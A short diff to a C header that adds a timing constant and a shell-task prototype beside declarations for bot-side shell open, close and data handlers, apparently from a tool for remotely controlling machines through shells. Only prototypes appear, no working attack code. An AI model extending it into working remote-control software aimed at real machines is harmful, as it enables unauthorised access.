@@ -3,6 +3,8 @@
 
 #include <stddef.h>
 
+#define LAIKA_SHELL_TASK_DELTA 50
+
 struct sLaika_bot;
 struct sLaika_shell;
 
@@ -17,5 +19,7 @@ bool laikaB_writeShell(struct sLaika_bot *bot, struct sLaika_shell *shell, char 
 void laikaB_handleShellOpen(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData);
 void laikaB_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData);
 void laikaB_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData);
+
+void laikaB_shellTask(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick, void *uData);
 
 #endif
